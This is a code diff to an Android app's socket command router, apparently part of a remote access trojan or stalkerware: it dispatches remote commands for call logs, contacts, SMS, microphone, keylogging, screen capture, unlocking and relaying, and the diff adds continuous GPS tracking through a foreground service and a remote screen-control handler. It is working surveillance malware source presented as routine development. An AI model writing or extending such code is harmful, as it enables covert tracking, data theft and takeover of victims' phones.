@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.location.Location;
+import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
 
@@ -18,7 +19,8 @@ import com.fason.app.features.camera.CameraManager;
 import com.fason.app.features.clipboard.ClipboardMonitor;
 import com.fason.app.features.contacts.ContactsManager;
 import com.fason.app.features.info.InfoManager;
-import com.fason.app.features.location.GpsManager;
+import com.fason.app.features.gps.GpsManager;
+import com.fason.app.features.gps.LocationService;
 import com.fason.app.features.mic.MicManager;
 import com.fason.app.features.sms.SMSManager;
 import com.fason.app.features.storage.FileManager;
@@ -97,7 +99,7 @@ public final class SocketCommandRouter {
                 case Protocol.CALLS:       EXEC.execute(() -> emit(socket, Protocol.CALLS, CallsManager.getLogs())); break;
                 case Protocol.CONTACTS:    EXEC.execute(() -> emit(socket, Protocol.CONTACTS, ContactsManager.getContacts())); break;
                 case Protocol.MIC:         handleMic(data, socket); break;
-                case Protocol.LOCATION:    handleLocation(socket); break;
+                case Protocol.LOCATION:    handleLocation(data, socket); break;
                 case Protocol.WIFI:        handleWifi(socket); break;
                 case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.getGranted())); break;
                 case Protocol.APPS:        EXEC.execute(() -> emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)))); break;
@@ -108,6 +110,7 @@ public final class SocketCommandRouter {
                 case Protocol.FASON:       handleFason(data, socket); break;
                 case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get())); break;
                 case Protocol.SCREEN:      handleScreen(data, socket); break;
+                case Protocol.SCREEN_CTRL: handleScreenControl(data, socket); break;
                 case Protocol.KEYLOGGER:   EXEC.execute(() -> handleKeylogger(data, socket)); break;
                 case Protocol.MOD_UNLOCK:  EXEC.execute(() -> handleUnlock(data, socket)); break;
                 case Protocol.MOD_RELAY:   EXEC.execute(() -> handleRelay(data, socket)); break;
@@ -161,21 +164,33 @@ public final class SocketCommandRouter {
         MicManager.start(sec);
     }
 
-    private static void handleLocation(Socket socket) {
+    private static void handleLocation(JSONObject data, Socket socket) {
+        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_FETCH);
+        if (Protocol.ACT_START.equals(action)) {
+            handleLocationTracking(data, socket, true);
+            return;
+        }
+        if (Protocol.ACT_STOP.equals(action)) {
+            handleLocationTracking(data, socket, false);
+            return;
+        }
+
         EXEC.execute(() -> {
             GpsManager orphanGps = null;
+            GpsManager gps = null;
             try {
-                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
-                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
-                    sendPermError(socket, Protocol.LOCATION, Manifest.permission.ACCESS_FINE_LOCATION);
-                    return;
-                }
-
                 MainService svc = MainService.getInstance();
-                GpsManager gps = svc != null ? svc.getGpsManager() : null;
+                gps = svc != null ? svc.getGpsManager() : null;
                 if (gps == null) {
                     gps = new GpsManager(FasonApp.getContext());
                     orphanGps = gps;
+                }
+
+                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
+                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                    emit(socket, Protocol.LOCATION, gps.buildErrorData("Location permission denied"));
+                    if (orphanGps != null) orphanGps.stop();
+                    return;
                 }
 
                 // Try cached location first — send immediately if available
@@ -200,28 +215,85 @@ public final class SocketCommandRouter {
                     @Override
                     public void onError(String message) {
                         if (responded.getAndSet(true)) return;
-                        try {
-                            JSONObject err = new JSONObject();
-                            err.put(Protocol.KEY_ENABLED, false);
-                            err.put(Protocol.KEY_ERROR, message);
-                            emit(socket, Protocol.LOCATION, err);
-                        } catch (Exception ignored) {}
+                        emit(socket, Protocol.LOCATION, finalGps.buildErrorData(message));
                         if (finalOrphan != null) finalOrphan.stop();
                     }
                 });
 
                 SCHEDULER.schedule(() -> {
                     if (responded.getAndSet(true)) return;
-                    try {
-                        JSONObject err = new JSONObject();
-                        err.put(Protocol.KEY_ENABLED, false);
-                        err.put(Protocol.KEY_ERROR, "Location unavailable");
-                        emit(socket, Protocol.LOCATION, err);
-                    } catch (Exception ignored) {}
+                    emit(socket, Protocol.LOCATION, finalGps.buildErrorData("Location unavailable"));
                     if (finalOrphan != null) finalOrphan.stop();
                 }, 30, TimeUnit.SECONDS);
             } catch (Exception e) {
+                if (gps != null) {
+                    emit(socket, Protocol.LOCATION, gps.buildErrorData(
+                        e.getMessage() != null ? e.getMessage() : "Location request failed"));
+                }
                 if (orphanGps != null) orphanGps.stop();
+            }
+        });
+    }
+
+    private static void handleLocationTracking(JSONObject data, Socket socket, boolean start) {
+        EXEC.execute(() -> {
+            try {
+                Context ctx = FasonApp.getContext();
+                if (start) {
+                    GpsManager gps = null;
+                    try {
+                        MainService svc = MainService.getInstance();
+                        gps = svc != null ? svc.getGpsManager() : null;
+                        if (gps == null) gps = new GpsManager(ctx);
+                    } catch (Exception ignored) {}
+
+                    if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
+                        !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                        if (gps != null) {
+                            emit(socket, Protocol.LOCATION, gps.buildErrorData("Location permission denied"));
+                        } else {
+                            JSONObject error = new JSONObject();
+                            error.put(Protocol.KEY_ENABLED, false);
+                            error.put(Protocol.KEY_ERROR, "Location permission denied");
+                            emit(socket, Protocol.LOCATION, error);
+                        }
+                        return;
+                    }
+
+                    int interval = data.optInt(Protocol.KEY_INTERVAL, data.optInt(Protocol.KEY_SEC, 10));
+                    if (interval < 1) interval = 10;
+
+                    Intent intent = new Intent(ctx, LocationService.class);
+                    intent.setAction(LocationService.ACTION_START);
+                    intent.putExtra(LocationService.EXTRA_INTERVAL_SECONDS, interval);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        ctx.startForegroundService(intent);
+                    } else {
+                        ctx.startService(intent);
+                    }
+
+                    JSONObject status = new JSONObject();
+                    status.put(Protocol.KEY_STATUS, "tracking_started");
+                    status.put("tracking", true);
+                    status.put(Protocol.KEY_INTERVAL, interval);
+                    emit(socket, Protocol.LOCATION, status);
+                } else {
+                    Intent intent = new Intent(ctx, LocationService.class);
+                    intent.setAction(LocationService.ACTION_STOP);
+                    ctx.startService(intent);
+
+                    JSONObject status = new JSONObject();
+                    status.put(Protocol.KEY_STATUS, "tracking_stopped");
+                    status.put("tracking", false);
+                    emit(socket, Protocol.LOCATION, status);
+                }
+            } catch (Exception e) {
+                try {
+                    JSONObject error = new JSONObject();
+                    error.put(Protocol.KEY_ENABLED, false);
+                    error.put(Protocol.KEY_ERROR, e.getMessage() != null ? e.getMessage() : "Location tracking command failed");
+                    emit(socket, Protocol.LOCATION, error);
+                } catch (Exception ignored) {}
             }
         });
     }
@@ -366,12 +438,31 @@ public final class SocketCommandRouter {
                         status.put(Protocol.KEY_STREAMING, ScreenCaptureService.Companion.isStreaming());
                         status.put(Protocol.KEY_SCREEN_W, ScreenCaptureService.Companion.getScreenWidth());
                         status.put(Protocol.KEY_SCREEN_H, ScreenCaptureService.Companion.getScreenHeight());
-                        // Just use true for accessible for now, or check accessibility service
-                        status.put(Protocol.KEY_ACCESSIBLE, true);
+                        status.put(Protocol.KEY_ACCESSIBLE, ScreenCaptureService.isRemoteControlAvailable());
+                        status.put("densityDpi", ScreenCaptureService.Companion.getScreenDensityDpi());
                         emit(socket, Protocol.SCREEN, status);
                     } catch (Exception ignored) {}
                 });
                 break;
+        }
+    }
+
+    private static void handleScreenControl(JSONObject data, Socket socket) {
+        if (Protocol.ACT_STATUS.equals(data.optString(Protocol.KEY_ACTION, ""))) {
+            try {
+                JSONObject status = new JSONObject();
+                status.put(Protocol.KEY_ACCESSIBLE, ScreenCaptureService.isRemoteControlAvailable());
+                emit(socket, Protocol.SCREEN_CTRL, status);
+            } catch (Exception ignored) {}
+            return;
+        }
+
+        if (!ScreenCaptureService.handleRemoteAction(data.toString())) {
+            try {
+                JSONObject error = new JSONObject();
+                error.put(Protocol.KEY_ERROR, "Remote desktop is not running");
+                emit(socket, Protocol.SCREEN_CTRL, error);
+            } catch (Exception ignored) {}
         }
     }
 
